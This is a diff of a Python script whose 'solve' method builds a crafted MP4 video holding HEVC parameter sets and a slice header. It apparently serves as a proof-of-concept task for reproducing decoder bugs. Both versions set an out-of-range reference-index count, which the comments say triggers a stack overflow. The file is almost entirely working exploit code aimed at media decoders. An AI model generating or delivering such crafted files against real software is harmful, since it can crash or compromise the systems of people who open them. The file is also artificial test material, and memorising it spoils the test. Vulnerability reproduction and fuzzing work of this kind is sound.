@@ -1,126 +1,192 @@
 import struct
-import io
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        return self.generate_poc()
-
-    def generate_poc(self) -> bytes:
-        # Helper functions
-        def u8(v): return struct.pack('>B', v)
-        def u16(v): return struct.pack('>H', v)
-        def u32(v): return struct.pack('>I', v)
-        def s32(v): return struct.pack('>i', v)
-
-        class BitStream:
+        class BitWriter:
             def __init__(self):
-                self.data = bytearray()
-                self.byte = 0
-                self.cnt = 0
-            def write(self, val, bits):
-                for i in range(bits)[::-1]:
-                    self.byte = (self.byte << 1) | ((val >> i) & 1)
-                    self.cnt += 1
-                    if self.cnt == 8:
-                        self.data.append(self.byte)
-                        self.byte = 0
-                        self.cnt = 0
-            def ue(self, val):
-                val += 1
-                bits = val.bit_length()
-                self.write(0, bits - 1)
-                self.write(val, bits)
-            def se(self, val):
-                if val <= 0: self.ue(-2*val)
-                else: self.ue(2*val - 1)
-            def get(self):
-                if self.cnt > 0: self.data.append(self.byte << (8-self.cnt))
-                return bytes(self.data)
+                self.bits = []
+            
+            def write(self, val, n):
+                for i in range(n - 1, -1, -1):
+                    self.bits.append((val >> i) & 1)
 
-        def make_box(type, data):
-            return u32(len(data) + 8) + type + data
+            def write_ue(self, val):
+                if val == 0:
+                    self.write(1, 1)
+                else:
+                    temp = val + 1
+                    length = temp.bit_length()
+                    self.write(0, length - 1)
+                    self.write(temp, length)
+            
+            def write_se(self, val):
+                if val > 0:
+                    ue = 2 * val - 1
+                else:
+                    ue = -2 * val
+                self.write_ue(ue)
 
-        # 1. Generate SPS (Minimal valid)
-        bs = BitStream()
-        bs.write(0, 1); bs.write(33, 6); bs.write(0, 6); bs.write(1, 3) # NAL 33
-        bs.write(0, 4); bs.write(0, 3); bs.write(1, 1) # vps_id, max_sub_layers, nesting
-        bs.write(0, 2); bs.write(0, 1); bs.write(1, 5); bs.write(0x60000000, 32); bs.write(0, 48); bs.write(0, 8) # PTL (Main)
-        bs.ue(0) # sps_id
-        bs.ue(1) # chroma 4:2:0
-        bs.ue(64); bs.ue(64) # w, h
-        bs.write(0, 1); bs.ue(0); bs.ue(0) # conf window, bit depths
-        bs.ue(0) # log2_max_poc_lsb_minus4 -> 4
-        bs.write(1, 1) # sub_layer_ordering
-        bs.ue(0); bs.ue(0); bs.ue(0)
-        bs.ue(0); bs.ue(0); bs.ue(0); bs.ue(0); bs.ue(0); bs.ue(0) # log2 sizes
-        bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1) # flags
-        bs.ue(0) # num_short_term_ref_pic_sets
-        bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1) # more flags
-        bs.write(1, 1) # trailing
-        sps = bs.get()
+            def get_bytes(self):
+                rem = len(self.bits) % 8
+                if rem != 0:
+                    self.bits.extend([0] * (8 - rem))
+                
+                out = bytearray()
+                for i in range(0, len(self.bits), 8):
+                    val = 0
+                    for j in range(8):
+                        val = (val << 1) | self.bits[i+j]
+                    out.append(val)
+                
+                final = bytearray()
+                zeros = 0
+                for b in out:
+                    if zeros == 2 and (b <= 3):
+                        final.append(3)
+                        zeros = 0
+                    final.append(b)
+                    if b == 0:
+                        zeros += 1
+                    else:
+                        zeros = 0
+                return final
 
-        # 2. Generate PPS (Minimal valid)
-        bs = BitStream()
-        bs.write(0, 1); bs.write(34, 6); bs.write(0, 6); bs.write(1, 3) # NAL 34
-        bs.ue(0); bs.ue(0) # pps_id, sps_id
-        bs.write(0, 1); bs.write(0, 1); bs.write(0, 3); bs.write(0, 1); bs.write(0, 1)
-        bs.ue(0); bs.ue(0); bs.se(0)
-        bs.write(0, 1); bs.write(0, 1); bs.write(0, 1)
-        bs.ue(0); bs.se(0); bs.se(0)
-        bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1)
-        bs.write(1, 1)
-        pps = bs.get()
+        def get_sps():
+            bw = BitWriter()
+            # NAL Header SPS (33) -> 0x42 0x01
+            bw.write(0x4201, 16)
+            bw.write(0, 4) # vp_id
+            bw.write(0, 3) # max_sub_layers-1
+            bw.write(1, 1) # temp_id_nesting
+            bw.write(0, 2) # profile_space
+            bw.write(0, 1) # tier
+            bw.write(1, 5) # profile_idc
+            bw.write(0x60000000, 32) # flags
+            bw.write(0, 48) # constraints
+            bw.write(30, 8) # level
+            bw.write_ue(0) # sps_id
+            bw.write_ue(1) # chroma
+            bw.write_ue(64) # w
+            bw.write_ue(64) # h
+            bw.write(0, 1) # conformance
+            bw.write_ue(0) # bd luma
+            bw.write_ue(0) # bd chroma
+            bw.write_ue(0) # log2_max_poc
+            bw.write(1, 1) # sub_layer_ordering
+            bw.write_ue(0) # max_dec
+            bw.write_ue(0) # num_reorder
+            bw.write_ue(0) # max_latency
+            bw.write_ue(0) # log2_min_luma
+            bw.write_ue(0) # log2_diff
+            bw.write_ue(0) # log2_min_trans
+            bw.write_ue(0) # log2_diff_trans
+            bw.write_ue(0) # max_trans_inter
+            bw.write_ue(0) # max_trans_intra
+            bw.write(0, 1) # scaling
+            bw.write(0, 1) # amp
+            bw.write(0, 1) # sao
+            bw.write(0, 1) # pcm
+            bw.write_ue(0) # num_short
+            bw.write(0, 1) # long_term
+            bw.write(0, 1) # sps_temp_mvp
+            bw.write(0, 1) # strong_intra
+            bw.write(0, 1) # vui
+            bw.write(0, 1) # ext
+            bw.write(1, 1) # stop
+            return bw.get_bytes()
 
-        # 3. Generate Malicious Slice Header (Triggers overflow)
-        bs = BitStream()
-        bs.write(0, 1); bs.write(1, 6); bs.write(0, 6); bs.write(1, 3) # NAL 1 (TRAIL_R)
-        bs.write(1, 1) # first_slice_segment_in_pic_flag
-        bs.ue(0) # slice_pic_parameter_set_id
-        bs.ue(1) # slice_type = P (1)
-        bs.write(0, 4) # slice_pic_order_cnt_lsb (4 bits due to SPS)
-        bs.write(1, 1) # short_term_ref_pic_set_sps_flag
-        bs.ue(0) # short_term_ref_pic_set_idx
-        # SPS flags define presence of other fields. temporal_mvp=0, sao=0 in generated SPS.
-        bs.write(1, 1) # num_ref_idx_active_override_flag = 1
-        bs.ue(100) # num_ref_idx_l0_active_minus1 = 100 (High value triggers stack overflow)
-        bs.write(1, 1) # rbsp trailing
-        slice_nal = bs.get()
+        def get_pps():
+            bw = BitWriter()
+            # NAL Header PPS (34) -> 0x44 0x01
+            bw.write(0x4401, 16)
+            bw.write_ue(0) # pps_id
+            bw.write_ue(0) # sps_id
+            bw.write(0, 1) # dep_slice
+            bw.write(0, 1) # output
+            bw.write(0, 3) # num_extra
+            bw.write(0, 1) # sign
+            bw.write(0, 1) # cabac
+            bw.write_ue(0) # l0_def
+            bw.write_ue(0) # l1_def
+            bw.write_se(0) # init_qp
+            bw.write(0, 1) # constrained
+            bw.write(0, 1) # transform
+            bw.write(0, 1) # cu_qp
+            bw.write_se(0) # cb
+            bw.write_se(0) # cr
+            bw.write(0, 1) # slice_chroma
+            bw.write(0, 1) # weight
+            bw.write(0, 1) # weight_bi
+            bw.write(0, 1) # transquant
+            bw.write(0, 1) # tiles
+            bw.write(0, 1) # entropy
+            bw.write(0, 1) # loop
+            bw.write(0, 1) # deblock
+            bw.write(0, 1) # scaling
+            bw.write(0, 1) # lists_mod
+            bw.write(0, 1) # par_merge
+            bw.write(0, 1) # slice_ext
+            bw.write(0, 1) # pps_ext
+            bw.write(1, 1) # stop
+            return bw.get_bytes()
 
-        # 4. Construct MP4 Container
-        ftyp = make_box(b'ftyp', b'iso5\x00\x00\x00\x01iso5hvc1')
+        def get_slice():
+            bw = BitWriter()
+            # NAL Header TRAIL_R (1) -> 0x02 0x01
+            bw.write(0x0201, 16)
+            bw.write(1, 1) # first_slice
+            bw.write_ue(0) # pps_id
+            bw.write_ue(1) # slice_type P
+            bw.write(0, 4) # poc_lsb
+            # implicit RPS (sps num_short=0)
+            bw.write(0, 1) # inter_ref_pred
+            bw.write_ue(0) # num_neg
+            bw.write_ue(0) # num_pos
+            # sps_temp_mvp=0, sao=0
+            bw.write(1, 1) # num_ref_idx_active_override
+            bw.write_ue(128) # num_ref_idx_l0_active_minus1 (OVERFLOW)
+            bw.write_se(0) # slice_qp_delta
+            bw.write(1, 1) # alignment
+            return bw.get_bytes()
+
+        sps = get_sps()
+        pps = get_pps()
+        slice_nal = get_slice()
+
+        def make_box(t, d): return struct.pack('>I', len(d)+8) + t.encode('ascii') + d
+        def make_full(t, v, f, d): return make_box(t, struct.pack('>I', (v<<24)|f) + d)
+
+        ftyp = make_box('ftyp', b'isom\x00\x00\x02\x00isomiso2mp41')
+        mdat_data = struct.pack('>I', len(slice_nal)) + slice_nal
+        mdat = make_box('mdat', mdat_data)
+
+        hvcc = bytearray([1, 1, 0x60, 0, 0, 0, 0, 0, 0, 30, 0xF0, 0, 0xFC, 0xFD, 0xF8, 0xF8, 0, 0, 0x0F, 2])
+        # SPS
+        hvcc.append(0x21)
+        hvcc.extend(struct.pack('>H', 1))
+        hvcc.extend(struct.pack('>H', len(sps)))
+        hvcc.extend(sps)
+        # PPS
+        hvcc.append(0x22)
+        hvcc.extend(struct.pack('>H', 1))
+        hvcc.extend(struct.pack('>H', len(pps)))
+        hvcc.extend(pps)
+
+        stsd = make_full('stsd', 0, 0, struct.pack('>I', 1) + make_box('hvc1', b'\x00'*6 + struct.pack('>H', 1) + b'\x00'*16 + struct.pack('>HH', 64, 64) + b'\x00\x48\x00\x00'*2 + b'\x00'*4 + struct.pack('>H', 1) + b'\x00'*32 + struct.pack('>H', 24) + struct.pack('>h', -1) + make_box('hvcC', hvcc)))
         
-        # Payload: Length-prefixed NALUs in mdat
-        payload = u32(len(sps)) + sps + u32(len(pps)) + pps + u32(len(slice_nal)) + slice_nal
-        mdat = make_box(b'mdat', payload)
+        def build_moov(off):
+            stsz = make_full('stsz', 0, 0, struct.pack('>II', 0, 1) + struct.pack('>I', len(mdat_data)))
+            stco = make_full('stco', 0, 0, struct.pack('>II', 1, off))
+            stsc = make_full('stsc', 0, 0, struct.pack('>IIII', 1, 1, 1, 1))
+            stts = make_full('stts', 0, 0, struct.pack('>II', 1, 100))
+            stbl = make_box('stbl', stsd + stts + stsc + stsz + stco)
+            minf = make_box('minf', make_full('vmhd', 0, 1, b'\x00'*8) + make_box('dinf', make_box('dref', make_full('dref', 0, 0, struct.pack('>I', 1) + make_full('url ', 0, 1, b'')))) + stbl)
+            mdia = make_box('mdia', make_full('mdhd', 0, 0, b'\x00'*16 + struct.pack('>II', 1000, 100) + b'\x55\xc4\x00\x00') + make_full('hdlr', 0, 0, b'\x00'*8 + b'vide' + b'\x00'*12 + b'Video\x00') + minf)
+            trak = make_box('trak', make_full('tkhd', 0, 7, b'\x00'*12 + struct.pack('>I', 1) + b'\x00'*4 + struct.pack('>I', 100) + b'\x00'*44 + b'\x00\x01\x00\x00' + b'\x00\x00\x00\x00'*2 + b'\x00\x01\x00\x00' + b'\x00\x00\x00\x00'*2 + b'\x40\x00\x00\x00' + struct.pack('>II', 64<<16, 64<<16)) + mdia)
+            return make_box('moov', make_full('mvhd', 0, 0, b'\x00'*12 + struct.pack('>I', 1000) + struct.pack('>I', 100) + b'\x00\x01\x00\x00\x01\x00\x00\x00' + b'\x00'*10 + b'\x00\x01\x00\x00' + b'\x00\x00\x00\x00'*2 + b'\x00\x01\x00\x00' + b'\x00\x00\x00\x00'*2 + b'\x40\x00\x00\x00' + b'\x00'*24 + struct.pack('>I', 2)) + trak)
 
-        # moov structure
-        mvhd_c = b'\x00'*4 + b'\x00'*8 + u32(1000) + u32(1000) + u32(0x00010000) + b'\x01\x00' + b'\x00\x00' + b'\x00'*8 + b'\x00\x01\x00\x00' + b'\x00\x00\x00\x00'*3 + b'\x00\x01\x00\x00' + b'\x00\x00\x00\x00'*3 + b'\x40\x00\x00\x00' + b'\x00'*24 + u32(2)
-        mvhd = make_box(b'mvhd', mvhd_c)
-
-        tkhd_c = b'\x00'*4 + b'\x00'*8 + u32(1) + b'\x00'*4 + u32(0) + b'\x00'*8 + b'\x00\x00'*2 + b'\x01\x00' + b'\x00\x00' + b'\x00\x01\x00\x00' + b'\x00\x00\x00\x00'*3 + b'\x00\x01\x00\x00' + b'\x00\x00\x00\x00'*3 + b'\x40\x00\x00\x00' + u32(64<<16) + u32(64<<16)
-        tkhd = make_box(b'tkhd', tkhd_c)
-
-        mdhd = make_box(b'mdhd', b'\x00'*4 + b'\x00'*8 + u32(1000) + u32(0) + b'\x55\xc4' + b'\x00\x00')
-        hdlr = make_box(b'hdlr', b'\x00'*8 + b'vide' + b'\x00'*12 + b'Video\0')
-        vmhd = make_box(b'vmhd', b'\x00'*4 + b'\x00\x01' + b'\x00'*8)
-        dinf = make_box(b'dinf', make_box(b'dref', b'\x00'*4 + u32(1) + make_box(b'url ', b'\x00\x00\x00\x01')))
-
-        # Minimal hvcC for decoder initialization (can use dummy values, we provide in-band parameters)
-        hvcC_data = b'\x01' + b'\x01' + b'\x60\x00\x00\x00' + b'\x00'*6 + b'\x00' + b'\xf0\x00' + b'\xfc' + b'\xfd' + b'\xf8' + b'\xf8' + b'\x00\x00' + b'\x0f' + b'\x00'
-        hvcC = make_box(b'hvcC', hvcC_data)
-        hvc1 = make_box(b'hvc1', b'\x00'*6 + u16(1) + b'\x00'*16 + u16(64) + u16(64) + u16(72) + u16(72) + b'\x00'*4 + u16(1) + b'\x00'*32 + b'\x00\x18' + b'\xff\xff' + hvcC)
-        stsd = make_box(b'stsd', b'\x00'*4 + u32(1) + hvc1)
+        dummy = build_moov(0)
+        offset = len(ftyp) + len(dummy) + 8
+        moov = build_moov(offset)
         
-        stts = make_box(b'stts', b'\x00'*4 + u32(1) + u32(1) + u32(100))
-        stsc = make_box(b'stsc', b'\x00'*4 + u32(1) + u32(1) + u32(1) + u32(1))
-        stsz = make_box(b'stsz', b'\x00'*4 + u32(0) + u32(1) + u32(len(payload)))
-        # stco: offset to mdat payload. ftyp len (24) + mdat header (8) = 32
-        stco = make_box(b'stco', b'\x00'*4 + u32(1) + u32(len(ftyp) + 8))
-
-        stbl = make_box(b'stbl', stsd + stts + stsc + stsz + stco)
-        minf = make_box(b'minf', vmhd + dinf + stbl)
-        mdia = make_box(b'mdia', mdhd + hdlr + minf)
-        trak = make_box(b'trak', tkhd + mdia)
-        moov = make_box(b'moov', mvhd + trak)
-
-        return ftyp + mdat + moov
+        return ftyp + moov + mdat
